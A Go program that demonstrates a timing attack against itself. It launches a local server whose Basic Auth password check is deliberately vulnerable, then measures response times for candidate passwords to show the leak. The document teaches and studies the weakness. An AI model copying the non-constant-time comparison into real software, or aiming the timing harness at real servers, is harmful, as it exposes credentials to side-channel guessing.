package main

import (
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/braintree/manners"
	"github.com/gonum/stat"
)

const secret = "badcab"

func main() {
	// Create a vulnerable web server
	go launchServer()

	attack()

	// Close the web server
	manners.Close()
}

func launchServer() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		_, p, ok := r.BasicAuth()

		// The comparison `p != secret` takes variable time so it is vulnerable
		// to timing attacks
		if !ok || p != secret {
			w.Header().Set("WWW-Authenticate", `Basic realm="Secret Stuff"`)
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte("401 Unauthorized\n"))
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("Jackpot"))
	})
	err := manners.ListenAndServe(":8080", http.DefaultServeMux)
	if err != nil {
		log.Fatalf("Could not launch server: %v", err)
	}
}

func attack() {

	// First make a dummy request to the server and throw away the result. The
	// server kind of "wakes up" on the first request and we don't want that
	// extra delay in our results

	http.Get("http://0.0.0.0:8080/")

	tries := map[string][]float64{}
	passwords := []string{"abc", "foobar", "badcaB", "Badcab"}

	fmt.Printf("The correct password is %s\n", secret)

	for _, p := range passwords {
		fmt.Print("Trying " + p + " ")
		var times []float64
		for i := 0; i < 1000000; i++ {
			if i%100000 == 0 {
				fmt.Print(".")
			}
			req, _ := http.NewRequest("GET", "http://0.0.0.0:8080/", nil)
			req.SetBasicAuth("jacob", p)

			// Make a new client with a new transport for every request. This
			// would be incredibly inefficient for production code but we don't
			// want any connections to be cached.
			client := http.Client{
				Transport: &http.Transport{},
			}

			start := time.Now()
			res, _ := client.Do(req)
			diff := time.Since(start)

			_ = res

			times = append(times, float64(diff.Nanoseconds()))
		}
		fmt.Print("\n")
		tries[p] = times
	}

	for _, p := range passwords {
		mean := stat.Mean(tries[p], nil)
		fmt.Printf("PW: %6s\tMean: %f ns\n", p, mean)
	}
}
